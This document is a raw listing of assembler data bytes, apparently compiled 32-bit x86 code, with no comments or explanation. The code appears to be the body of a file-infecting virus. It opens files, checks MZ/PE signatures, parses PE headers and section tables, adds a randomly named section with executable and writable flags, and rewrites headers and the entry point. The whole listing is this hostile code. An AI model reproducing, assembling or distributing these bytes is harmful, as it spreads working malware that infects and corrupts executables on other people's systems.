db 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 074h, 05bh, 06ah, 000h, 0ffh, 076h, 03ch
db 057h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 083h, 0c4h, 00ch, 085h, 0c0h, 075h, 048h
db 057h, 06ah, 001h, 08dh, 046h, 040h, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h
db 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 074h, 02fh, 00fh, 0b7h, 046h
db 046h, 057h, 06ah, 001h, 08dh, 004h, 080h, 081h, 0c6h, 038h, 001h, 000h, 000h, 0c1h
db 0e0h, 003h, 050h, 056h, 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 085h
db 0c0h, 074h, 00dh, 057h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 06ah, 001h, 058h
db 0ebh, 00ah, 057h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 033h, 0c0h, 05fh, 05eh
db 0c3h, 055h, 08bh, 0ech, 083h, 0ech, 040h, 053h, 056h, 068h, 078h, 014h, 000h, 000h
db 033h, 0dbh, 0ffh, 075h, 008h, 0ffh, 015h, 09ch, 050h, 000h, 000h, 08bh, 0f0h, 059h
db 085h, 0f6h, 059h, 074h, 05eh, 056h, 06ah, 040h, 08dh, 045h, 0c0h, 06ah, 001h, 050h
db 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 083h, 0f8h, 040h, 075h, 03fh
db 066h, 081h, 07dh, 0c0h, 05ah, 04dh, 074h, 008h, 066h, 081h, 07dh, 0c0h, 04dh, 05ah
db 075h, 02fh, 06ah, 000h, 0ffh, 075h, 0fch, 056h, 0ffh, 015h, 0ach, 050h, 000h, 000h
db 056h, 06ah, 040h, 08dh, 045h, 0c0h, 06ah, 001h, 050h, 0ffh, 015h, 0a4h, 050h, 000h
db 000h, 083h, 0c4h, 01ch, 083h, 0f8h, 040h, 075h, 00ch, 081h, 07dh, 0c0h, 050h, 045h
db 000h, 000h, 075h, 003h, 08bh, 05dh, 0e8h, 056h, 0ffh, 015h, 0a0h, 050h, 000h, 000h
db 059h, 08bh, 0c3h, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech, 08bh, 04dh, 008h, 056h
db 033h, 0c0h, 08bh, 0b1h, 04ch, 001h, 000h, 000h, 08dh, 091h, 048h, 001h, 000h, 000h
db 003h, 032h, 039h, 075h, 00ch, 072h, 00ah, 090h, 08bh, 072h, 02ch, 040h, 083h, 0c2h
db 028h, 0ebh, 0efh, 08dh, 004h, 080h, 05eh, 08dh, 014h, 0c1h, 08bh, 084h, 0c1h, 044h
db 001h, 000h, 000h, 02bh, 082h, 04ch, 001h, 000h, 000h, 003h, 041h, 074h, 003h, 045h
db 00ch, 05dh, 0c3h, 055h, 08bh, 0ech, 08bh, 045h, 008h, 056h, 033h, 0c9h, 08bh, 0b0h
db 04ch, 001h, 000h, 000h, 08dh, 090h, 048h, 001h, 000h, 000h, 003h, 032h, 039h, 075h
db 00ch, 072h, 00ah, 090h, 08bh, 072h, 02ch, 041h, 083h, 0c2h, 028h, 0ebh, 0efh, 08dh
db 00ch, 089h, 05eh, 08dh, 00ch, 0c8h, 08bh, 081h, 044h, 001h, 000h, 000h, 02bh, 081h
db 04ch, 001h, 000h, 000h, 003h, 045h, 00ch, 05dh, 0c3h, 055h, 08bh, 0ech, 08bh, 045h
db 008h, 056h, 033h, 0c9h, 08bh, 0b0h, 048h, 001h, 000h, 000h, 08dh, 090h, 044h, 001h
db 000h, 000h, 003h, 032h, 039h, 075h, 00ch, 072h, 00ah, 090h, 08bh, 072h, 02ch, 041h
db 083h, 0c2h, 028h, 0ebh, 0efh, 08dh, 00ch, 089h, 05eh, 08dh, 00ch, 0c8h, 08bh, 081h
db 04ch, 001h, 000h, 000h, 02bh, 081h, 044h, 001h, 000h, 000h, 003h, 045h, 00ch, 05dh
db 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 008h, 010h, 000h, 000h, 053h, 033h, 0dbh, 039h
db 05dh, 008h, 056h, 057h, 089h, 05dh, 0fch, 00fh, 084h, 099h, 002h, 000h, 000h, 068h
db 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 09ch, 050h, 000h, 000h, 08bh
db 0f8h, 059h, 03bh, 0fbh, 059h, 089h, 07dh, 008h, 00fh, 084h, 07ch, 002h, 000h, 000h
db 057h, 06ah, 001h, 08dh, 085h, 0f8h, 0efh, 0ffh, 0ffh, 06ah, 040h, 050h, 0ffh, 015h
db 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 00fh, 084h, 057h, 002h, 000h
db 000h, 080h, 0bdh, 0f8h, 0efh, 0ffh, 0ffh, 04dh, 075h, 009h, 080h, 0bdh, 0f9h, 0efh
db 0ffh, 0ffh, 05ah, 074h, 01ah, 080h, 0bdh, 0f9h, 0efh, 0ffh, 0ffh, 04dh, 00fh, 085h
db 038h, 002h, 000h, 000h, 080h, 0bdh, 0f8h, 0efh, 0ffh, 0ffh, 05ah, 00fh, 085h, 02bh
db 002h, 000h, 000h, 08bh, 085h, 034h, 0f0h, 0ffh, 0ffh, 053h, 050h, 057h, 089h, 045h
db 0f8h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 057h, 06ah, 001h, 08dh, 085h, 0f8h, 0efh
db 0ffh, 0ffh, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h, 0a4h, 050h, 000h, 000h
db 083h, 0c4h, 01ch, 085h, 0c0h, 00fh, 084h, 0f9h, 001h, 000h, 000h, 081h, 0bdh, 0f8h
db 0efh, 0ffh, 0ffh, 050h, 045h, 000h, 000h, 00fh, 085h, 0e9h, 001h, 000h, 000h, 00fh
db 0b7h, 0b5h, 0feh, 0efh, 0ffh, 0ffh, 083h, 0feh, 032h, 00fh, 083h, 0d9h, 001h, 000h
db 000h, 057h, 056h, 08dh, 085h, 0f8h, 0f7h, 0ffh, 0ffh, 06ah, 028h, 050h, 0ffh, 015h
db 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 03bh, 0f0h, 00fh, 085h, 0bdh, 001h, 000h
db 000h, 057h, 0ffh, 015h, 0b4h, 050h, 000h, 000h, 059h, 08bh, 08dh, 00ch, 0f8h, 0ffh
db 0ffh, 02bh, 0c8h, 083h, 0f9h, 028h, 00fh, 082h, 0a4h, 001h, 000h, 000h, 06ah, 008h
db 06ah, 001h, 0e8h, 007h, 019h, 000h, 000h, 08dh, 034h, 0b6h, 059h, 0c1h, 0e6h, 003h
db 059h, 089h, 045h, 0fch, 08dh, 00ch, 006h, 080h, 0a4h, 00dh, 0f8h, 0f7h, 0ffh, 0ffh
db 000h, 03bh, 0c3h, 074h, 017h, 08dh, 09ch, 035h, 0f7h, 0f7h, 0ffh, 0ffh, 0e8h, 025h
db 019h, 000h, 000h, 08bh, 04dh, 0fch, 0ffh, 04dh, 0fch, 088h, 004h, 00bh, 075h, 0f0h
db 08bh, 085h, 034h, 0f0h, 0ffh, 0ffh, 08bh, 04dh, 00ch, 057h, 08dh, 05ch, 008h, 0ffh
db 048h, 0f7h, 0d0h, 023h, 0d8h, 0ffh, 015h, 0b4h, 050h, 000h, 000h, 06ah, 002h, 06ah
db 000h, 057h, 089h, 045h, 0f0h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 057h, 0ffh, 015h
db 0b4h, 050h, 000h, 000h, 08bh, 08dh, 034h, 0f0h, 0ffh, 0ffh, 06ah, 000h, 08dh, 07ch
db 001h, 0ffh, 049h, 0f7h, 0d1h, 023h, 0f9h, 057h, 0ffh, 075h, 008h, 0ffh, 015h, 0ach
db 050h, 000h, 000h, 08dh, 084h, 035h, 00ch, 0f8h, 0ffh, 0ffh, 06ah, 000h, 089h, 045h
db 0f4h, 089h, 038h, 08dh, 044h, 03bh, 0ffh, 050h, 0ffh, 075h, 008h, 0ffh, 015h, 0ach
db 050h, 000h, 000h, 0ffh, 075h, 008h, 08dh, 045h, 0fch, 033h, 0ffh, 06ah, 001h, 06ah
db 001h, 050h, 089h, 07dh, 0fch, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 08bh, 045h, 00ch
db 089h, 09ch, 035h, 008h, 0f8h, 0ffh, 0ffh, 066h, 089h, 0bch, 035h, 018h, 0f8h, 0ffh
db 0ffh, 066h, 089h, 0bch, 035h, 01ah, 0f8h, 0ffh, 0ffh, 089h, 0bch, 035h, 010h, 0f8h
db 0ffh, 0ffh, 089h, 0bch, 035h, 014h, 0f8h, 0ffh, 0ffh, 08dh, 09ch, 035h, 000h, 0f8h
db 0ffh, 0ffh, 08dh, 0bch, 035h, 004h, 0f8h, 0ffh, 0ffh, 083h, 0c4h, 03ch, 089h, 003h
db 08bh, 04fh, 0d8h, 003h, 04bh, 0d8h, 08bh, 085h, 030h, 0f0h, 0ffh, 0ffh, 08dh, 04ch
db 001h, 0ffh, 048h, 0f7h, 0d0h, 023h, 0c8h, 083h, 07dh, 010h, 002h, 089h, 00fh, 075h
db 00dh, 0c7h, 084h, 035h, 01ch, 0f8h, 0ffh, 0ffh, 020h, 000h, 000h, 060h, 0ebh, 01eh
db 083h, 07dh, 010h, 001h, 075h, 00dh, 0c7h, 084h, 035h, 01ch, 0f8h, 0ffh, 0ffh, 040h
db 000h, 000h, 0c0h, 0ebh, 00bh, 0c7h, 084h, 035h, 01ch, 0f8h, 0ffh, 0ffh, 040h, 000h
db 000h, 0e0h, 06ah, 000h, 0ffh, 075h, 0f0h, 0ffh, 075h, 008h, 0ffh, 015h, 0ach, 050h
db 000h, 000h, 0ffh, 075h, 008h, 08dh, 084h, 035h, 0f8h, 0f7h, 0ffh, 0ffh, 06ah, 001h
db 06ah, 028h, 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 06ah, 000h, 0ffh, 075h, 0f8h
db 0ffh, 075h, 008h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 08bh, 003h, 0ffh, 075h, 008h
db 003h, 007h, 066h, 0ffh, 085h, 0feh, 0efh, 0ffh, 0ffh, 06ah, 001h, 068h, 0f8h, 000h
db 000h, 000h, 089h, 085h, 048h, 0f0h, 0ffh, 0ffh, 08dh, 085h, 0f8h, 0efh, 0ffh, 0ffh
db 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 0a0h, 050h
db 000h, 000h, 08bh, 045h, 0f4h, 083h, 0c4h, 03ch, 08bh, 000h, 0ebh, 00ah, 057h, 0ffh
db 015h, 0a0h, 050h, 000h, 000h, 059h, 033h, 0c0h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 056h
db 08bh, 074h, 024h, 010h, 085h, 0f6h, 076h, 013h, 08bh, 04ch, 024h, 008h, 08bh, 044h
db 024h, 00ch, 02bh, 0c1h, 08ah, 014h, 008h, 088h, 011h, 041h, 04eh, 075h, 0f7h, 05eh
db 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 050h, 001h, 000h, 000h, 053h, 056h, 057h, 068h
db 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 09ch, 050h, 000h, 000h, 08bh
db 0f8h, 033h, 0f6h, 059h, 03bh, 0feh, 059h, 089h, 07dh, 008h, 00fh, 084h, 050h, 002h
db 000h, 000h, 057h, 06ah, 001h, 08dh, 045h, 0a8h, 06ah, 040h, 050h, 0ffh, 015h, 0a4h
db 050h, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 00fh, 084h, 0a5h, 002h, 000h, 000h
db 056h, 0ffh, 075h, 0e4h, 057h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 057h, 06ah, 001h
db 08dh, 085h, 0b0h, 0feh, 0ffh, 0ffh, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h
db 0a4h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 00fh, 084h, 07ah, 002h, 000h
db 000h, 00fh, 0b7h, 0bdh, 0b6h, 0feh, 0ffh, 0ffh, 089h, 07dh, 0f0h, 08dh, 01ch, 0bfh
db 0c1h, 0e3h, 003h, 053h, 06ah, 001h, 089h, 05dh, 0e8h, 0ffh, 015h, 0d4h, 050h, 000h
db 000h, 08bh, 0f0h, 059h, 085h, 0f6h, 059h, 00fh, 084h, 052h, 002h, 000h, 000h, 0ffh
db 075h, 008h, 0ffh, 015h, 0b4h, 050h, 000h, 000h, 0ffh, 075h, 008h, 089h, 045h, 0ech
db 057h, 06ah, 028h, 056h, 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 014h, 03bh
db 0c7h, 074h, 017h, 0ffh, 075h, 008h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 056h, 0ffh
db 015h, 0d8h, 050h, 000h, 000h, 059h, 059h, 0e9h, 0ach, 001h, 000h, 000h, 08bh, 07ch
db 033h, 0e4h, 003h, 07ch, 033h, 0e8h, 02bh, 07eh, 00ch, 057h, 06ah, 001h, 0ffh, 015h
db 0d4h, 050h, 000h, 000h, 059h, 089h, 045h, 0fch, 085h, 0c0h, 059h, 074h, 0cch, 083h
db 065h, 0f4h, 000h, 083h, 07dh, 0f0h, 000h, 076h, 050h, 08dh, 046h, 014h, 089h, 045h
db 0f8h, 0ebh, 003h, 08bh, 045h, 0f8h, 08bh, 058h, 0f8h, 06ah, 000h, 0ffh, 030h, 02bh
db 05eh, 00ch, 0ffh, 075h, 008h, 003h, 05dh, 0fch, 0ffh, 015h, 0ach, 050h, 000h, 000h
db 0ffh, 075h, 008h, 08bh, 045h, 0f8h, 06ah, 001h, 0ffh, 070h, 0fch, 053h, 0ffh, 015h
db 0a4h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 00fh, 084h, 02bh, 001h, 000h
db 000h, 0ffh, 045h, 0f4h, 083h, 045h, 0f8h, 028h, 08bh, 045h, 0f4h, 03bh, 045h, 0f0h
db 072h, 0bbh, 08bh, 05dh, 0e8h, 06ah, 000h, 0ffh, 076h, 014h, 0ffh, 075h, 008h, 0ffh
db 015h, 0ach, 050h, 000h, 000h, 0ffh, 075h, 008h, 06ah, 001h, 057h, 0ffh, 075h, 0fch
db 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 00fh, 084h, 0f1h
db 000h, 000h, 000h, 080h, 04eh, 027h, 0e0h, 0e8h, 0fdh, 014h, 000h, 000h, 0a8h, 001h
db 074h, 004h, 083h, 04eh, 024h, 020h, 0e8h, 0f0h, 014h, 000h, 000h, 0a8h, 001h, 074h
db 004h, 083h, 04eh, 024h, 040h, 0e8h, 0e3h, 014h, 000h, 000h, 0a8h, 001h, 074h, 004h
db 080h, 04eh, 024h, 080h, 089h, 07eh, 010h, 089h, 07eh, 008h, 0e8h, 0d0h, 014h, 000h
db 000h, 0a8h, 001h, 00fh, 084h, 084h, 000h, 000h, 000h, 0e8h, 0c3h, 014h, 000h, 000h
db 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h, 005h, 00ch, 05ah, 088h, 006h, 0e8h, 0b3h, 014h
db 000h, 000h, 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h, 005h, 00ch, 045h, 088h, 046h, 001h
db 0e8h, 0a2h, 014h, 000h, 000h, 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h, 005h, 00ch, 059h
db 088h, 046h, 002h, 0e8h, 091h, 014h, 000h, 000h, 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h
db 005h, 00ch, 041h, 088h, 046h, 003h, 0e8h, 080h, 014h, 000h, 000h, 0f6h, 0d0h, 024h
db 001h, 0c0h, 0e0h, 005h, 00ch, 056h, 088h, 046h, 004h, 0e8h, 06fh, 014h, 000h, 000h
db 0a8h, 001h, 074h, 01bh, 0c6h, 046h, 005h, 032h, 0c6h, 046h, 006h, 039h, 0e8h, 05eh
db 014h, 000h, 000h, 0f6h, 0d0h, 024h, 001h, 0c0h, 0e0h, 005h, 00ch, 041h, 088h, 046h
db 007h, 0ebh, 00ch, 0c6h, 046h, 005h, 036h, 0c6h, 046h, 006h, 036h, 0c6h, 046h, 007h
db 036h, 06ah, 000h, 0ffh, 075h, 0ech, 0ffh, 075h, 008h, 0ffh, 015h, 0ach, 050h, 000h
db 000h, 08dh, 043h, 0d8h, 050h, 08dh, 046h, 028h, 050h, 0e8h, 0b0h, 000h, 000h, 000h
db 0ffh, 075h, 008h, 06ah, 001h, 053h, 056h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h
db 0c4h, 024h, 085h, 0c0h, 075h, 020h, 0ffh, 075h, 008h, 0ffh, 015h, 0a0h, 050h, 000h
db 000h, 056h, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 0ffh, 075h, 0fch, 0ffh, 015h, 0d8h
db 050h, 000h, 000h, 083h, 0c4h, 00ch, 033h, 0c0h, 0ebh, 077h, 08bh, 085h, 0e8h, 0feh
db 0ffh, 0ffh, 089h, 0bdh, 0cch, 0feh, 0ffh, 0ffh, 089h, 0bdh, 0d0h, 0feh, 0ffh, 0ffh
db 08bh, 04eh, 010h, 003h, 04eh, 00ch, 06ah, 000h, 0ffh, 075h, 0e4h, 066h, 0c7h, 085h
db 0b6h, 0feh, 0ffh, 0ffh, 001h, 000h, 0ffh, 075h, 008h, 08dh, 04ch, 001h, 0ffh, 048h
db 0f7h, 0d0h, 023h, 0c8h, 089h, 08dh, 000h, 0ffh, 0ffh, 0ffh, 0ffh, 015h, 0ach, 050h
db 000h, 000h, 0ffh, 075h, 008h, 08dh, 085h, 0b0h, 0feh, 0ffh, 0ffh, 06ah, 001h, 068h
db 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 056h, 0ffh, 015h
db 0d8h, 050h, 000h, 000h, 0ffh, 075h, 0fch, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 083h
db 0c4h, 024h, 06ah, 001h, 05eh, 0ffh, 075h, 008h, 0ffh, 015h, 0a0h, 050h, 000h, 000h
db 059h, 08bh, 0c6h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 08bh, 04ch, 024h, 008h, 085h, 0c9h
db 076h, 016h, 08bh, 0d1h, 057h, 08bh, 07ch, 024h, 008h, 033h, 0c0h, 0c1h, 0e9h, 002h
db 0f3h, 0abh, 08bh, 0cah, 083h, 0e1h, 003h, 0f3h, 0aah, 05fh, 0c3h, 055h, 08bh, 0ech
db 081h, 0ech, 044h, 001h, 000h, 000h, 053h, 056h, 057h, 068h, 074h, 014h, 000h, 000h
db 0ffh, 075h, 008h, 0ffh, 015h, 09ch, 050h, 000h, 000h, 08bh, 0d8h, 059h, 085h, 0dbh
db 059h, 00fh, 084h, 0fbh, 000h, 000h, 000h, 053h, 06ah, 001h, 08dh, 045h, 0b4h, 06ah
db 040h, 050h, 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 075h
db 00ch, 053h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 0e9h, 0d8h, 000h, 000h, 000h, 06ah
db 000h, 0ffh, 075h, 0f0h, 053h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 053h, 06ah, 001h
db 08dh, 085h, 0bch, 0feh, 0ffh, 0ffh, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h
db 0a4h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 0cch, 00fh, 0b7h, 0bdh
db 0c2h, 0feh, 0ffh, 0ffh, 089h, 07dh, 0f8h, 08dh, 034h, 0bfh, 0c1h, 0e6h, 003h, 056h
db 06ah, 001h, 0ffh, 015h, 0d4h, 050h, 000h, 000h, 059h, 089h, 045h, 0fch, 059h, 085h
db 0c0h, 053h, 074h, 0aah, 0ffh, 015h, 0b4h, 050h, 000h, 000h, 053h, 057h, 06ah, 028h
db 089h, 045h, 0f4h, 0ffh, 075h, 0fch, 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h
db 014h, 03bh, 0c7h, 074h, 007h, 033h, 0f6h, 0e9h, 0ech, 000h, 000h, 000h, 08bh, 085h
db 0f8h, 0feh, 0ffh, 0ffh, 08bh, 04dh, 00ch, 06ah, 000h, 08dh, 07ch, 008h, 0ffh, 048h
db 0f7h, 0d0h, 023h, 0f8h, 08bh, 045h, 0fch, 003h, 0f0h, 08bh, 046h, 0ech, 003h, 046h
db 0e8h, 050h, 053h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 053h, 0ffh, 015h, 0b4h, 050h
db 000h, 000h, 089h, 045h, 00ch, 08dh, 047h, 0ffh, 06ah, 001h, 050h, 053h, 0ffh, 015h
db 0ach, 050h, 000h, 000h, 080h, 065h, 00bh, 000h, 053h, 06ah, 001h, 08dh, 045h, 00bh
db 06ah, 001h, 050h, 0ffh, 015h, 0a8h, 050h, 000h, 000h, 083h, 0c4h, 02ch, 085h, 0c0h
db 075h, 019h, 053h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 0ffh, 075h, 0fch, 0ffh, 015h
db 0d8h, 050h, 000h, 000h, 059h, 059h, 033h, 0c0h, 0e9h, 08fh, 000h, 000h, 000h, 06ah
db 000h, 0ffh, 075h, 0f4h, 053h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 001h, 07eh, 0e8h
db 053h, 0ffh, 075h, 0f8h, 001h, 07eh, 0e0h, 06ah, 028h, 0ffh, 075h, 0fch, 0ffh, 015h
db 0a8h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 03bh, 045h, 0f8h, 00fh, 085h, 05bh, 0ffh
db 0ffh, 0ffh, 001h, 0bdh, 0d8h, 0feh, 0ffh, 0ffh, 001h, 0bdh, 0dch, 0feh, 0ffh, 0ffh
db 08bh, 04eh, 0e4h, 08bh, 085h, 0f4h, 0feh, 0ffh, 0ffh, 003h, 04eh, 0e8h, 06ah, 000h
db 0ffh, 075h, 0f0h, 08dh, 04ch, 001h, 0ffh, 048h, 0f7h, 0d0h, 023h, 0c8h, 053h, 089h
db 08dh, 00ch, 0ffh, 0ffh, 0ffh, 0ffh, 015h, 0ach, 050h, 000h, 000h, 053h, 06ah, 001h
db 08dh, 085h, 0bch, 0feh, 0ffh, 0ffh, 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h
db 0a8h, 050h, 000h, 000h, 08bh, 075h, 00ch, 083h, 0c4h, 01ch, 053h, 0ffh, 015h, 0a0h
db 050h, 000h, 000h, 0ffh, 075h, 0fch, 0ffh, 015h, 0d8h, 050h, 000h, 000h, 059h, 08bh
db 0c6h, 059h, 05fh, 05eh, 05bh, 0c9h, 0c3h, 055h, 08bh, 0ech, 081h, 0ech, 008h, 009h
db 000h, 000h, 053h, 057h, 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h
db 09ch, 050h, 000h, 000h, 08bh, 0f8h, 033h, 0dbh, 059h, 03bh, 0fbh, 059h, 075h, 007h
db 033h, 0c0h, 0e9h, 08dh, 000h, 000h, 000h, 057h, 06ah, 001h, 08dh, 085h, 0f8h, 0f6h
db 0ffh, 0ffh, 06ah, 040h, 050h, 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h
db 085h, 0c0h, 075h, 008h, 057h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 056h, 053h
db 0ffh, 0b5h, 034h, 0f7h, 0ffh, 0ffh, 057h, 0ffh, 015h, 0ach, 050h, 000h, 000h, 057h
db 0beh, 0f8h, 000h, 000h, 000h, 06ah, 001h, 08dh, 085h, 038h, 0f7h, 0ffh, 0ffh, 056h
db 050h, 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 035h
db 053h, 0ffh, 0b5h, 034h, 0f7h, 0ffh, 0ffh, 057h, 0ffh, 015h, 0ach, 050h, 000h, 000h
db 057h, 06ah, 001h, 08dh, 085h, 038h, 0f7h, 0ffh, 0ffh, 056h, 050h, 089h, 09dh, 0dch
db 0f7h, 0ffh, 0ffh, 089h, 09dh, 0d8h, 0f7h, 0ffh, 0ffh, 0ffh, 015h, 0a8h, 050h, 000h
db 000h, 083h, 0c4h, 01ch, 085h, 0c0h, 074h, 003h, 06ah, 001h, 05bh, 057h, 0ffh, 015h
db 0a0h, 050h, 000h, 000h, 059h, 08bh, 0c3h, 05eh, 05fh, 05bh, 0c9h, 0c3h, 055h, 08bh
db 0ech, 081h, 0ech, 008h, 009h, 000h, 000h, 056h, 068h, 074h, 014h, 000h, 000h, 0ffh
db 075h, 008h, 0ffh, 015h, 09ch, 050h, 000h, 000h, 08bh, 0f0h, 059h, 085h, 0f6h, 059h
db 074h, 06dh, 056h, 06ah, 001h, 08dh, 085h, 0f8h, 0f6h, 0ffh, 0ffh, 06ah, 040h, 050h
db 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 075h, 008h, 056h
db 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 066h, 081h, 0bdh, 0f8h, 0f6h, 0ffh, 0ffh
db 05ah, 04dh, 074h, 00eh, 066h, 081h, 0bdh, 0f8h, 0f6h, 0ffh, 0ffh, 04dh, 05ah, 074h
db 003h, 056h, 0ebh, 02ch, 06ah, 000h, 0ffh, 0b5h, 034h, 0f7h, 0ffh, 0ffh, 056h, 0ffh
db 015h, 0ach, 050h, 000h, 000h, 056h, 06ah, 001h, 08dh, 085h, 038h, 0f7h, 0ffh, 0ffh
db 068h, 0f8h, 000h, 000h, 000h, 050h, 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h
db 01ch, 085h, 0c0h, 056h, 075h, 00ch, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 059h, 033h
db 0c0h, 05eh, 0c9h, 0c3h, 0ffh, 015h, 0a0h, 050h, 000h, 000h, 081h, 0bdh, 038h, 0f7h
db 0ffh, 0ffh, 050h, 045h, 000h, 000h, 059h, 075h, 0e8h, 066h, 083h, 0bdh, 03eh, 0f7h
db 0ffh, 0ffh, 001h, 074h, 0deh, 066h, 083h, 0bdh, 094h, 0f7h, 0ffh, 0ffh, 001h, 074h
db 0d4h, 0f6h, 085h, 04fh, 0f7h, 0ffh, 0ffh, 030h, 075h, 0cbh, 066h, 081h, 0bdh, 03ch
db 0f7h, 0ffh, 0ffh, 04ch, 001h, 075h, 0c0h, 06ah, 001h, 058h, 0ebh, 0bdh, 055h, 08bh
db 0ech, 081h, 0ech, 054h, 003h, 000h, 000h, 08bh, 04dh, 010h, 053h, 056h, 033h, 0c0h
db 08dh, 071h, 0ffh, 057h, 083h, 0e6h, 0fch, 089h, 045h, 0fch, 089h, 045h, 0f4h, 089h
db 045h, 0e8h, 089h, 045h, 0f8h, 089h, 075h, 010h, 00fh, 084h, 00ch, 003h, 000h, 000h
db 039h, 045h, 014h, 00fh, 084h, 003h, 003h, 000h, 000h, 08bh, 05dh, 01ch, 03bh, 0d8h
db 00fh, 084h, 0f8h, 002h, 000h, 000h, 08bh, 07dh, 018h, 08dh, 04fh, 008h, 03bh, 0f1h
db 00fh, 082h, 0eah, 002h, 000h, 000h, 039h, 045h, 008h, 00fh, 084h, 0e1h, 002h, 000h
db 000h, 068h, 074h, 014h, 000h, 000h, 0ffh, 075h, 008h, 0ffh, 015h, 09ch, 050h, 000h
db 000h, 059h, 089h, 045h, 0fch, 085h, 0c0h, 059h, 00fh, 084h, 0c6h, 002h, 000h, 000h
db 050h, 06ah, 001h, 08dh, 045h, 0a4h, 06ah, 040h, 050h, 0ffh, 015h, 0a4h, 050h, 000h
db 000h, 083h, 0c4h, 010h, 085h, 0c0h, 00fh, 084h, 0ach, 002h, 000h, 000h, 066h, 081h
db 07dh, 0a4h, 05ah, 04dh, 074h, 00ch, 066h, 081h, 07dh, 0a4h, 04dh, 05ah, 00fh, 085h
db 098h, 002h, 000h, 000h, 083h, 07dh, 0e0h, 000h, 00fh, 084h, 08eh, 002h, 000h, 000h
db 06ah, 000h, 0ffh, 075h, 0e0h, 0ffh, 075h, 0fch, 0ffh, 015h, 0ach, 050h, 000h, 000h
db 083h, 0c4h, 00ch, 085h, 0c0h, 00fh, 085h, 075h, 002h, 000h, 000h, 0ffh, 075h, 0fch
db 08dh, 085h, 0ach, 0fch, 0ffh, 0ffh, 06ah, 001h, 068h, 0f8h, 000h, 000h, 000h, 050h
db 0ffh, 015h, 0a4h, 050h, 000h, 000h, 083h, 0c4h, 010h, 085h, 0c0h, 00fh, 084h, 053h
db 002h, 000h, 000h, 081h, 0bdh, 0ach, 0fch, 0ffh, 0ffh, 050h, 045h, 000h, 000h, 00fh
db 085h, 043h, 002h, 000h, 000h, 083h, 0bdh, 0d4h, 0fch, 0ffh, 0ffh, 000h, 00fh, 084h
db 036h, 002h, 000h, 000h, 06ah, 000h, 0ffh, 075h, 00ch, 0ffh, 075h, 0fch, 0ffh, 015h
db 0ach, 050h, 000h, 000h, 083h, 0c4h, 00ch, 085h, 0c0h, 00fh, 085h, 01dh, 002h, 000h
db 000h, 08bh, 0c6h, 02bh, 0c7h, 048h, 050h, 06ah, 000h, 0e8h, 066h, 00fh, 000h, 000h
db 059h, 083h, 0f8h, 004h, 059h, 073h, 006h, 083h, 065h, 01ch, 000h, 0ebh, 006h, 048h
db 024h, 0fch, 089h, 045h, 01ch, 08bh, 0c6h, 02bh, 045h, 01ch, 02bh, 0c7h, 083h, 0f8h
db 004h, 073h, 004h, 083h, 065h, 01ch, 000h, 08bh, 045h, 01ch, 089h, 003h, 0e8h, 0bch
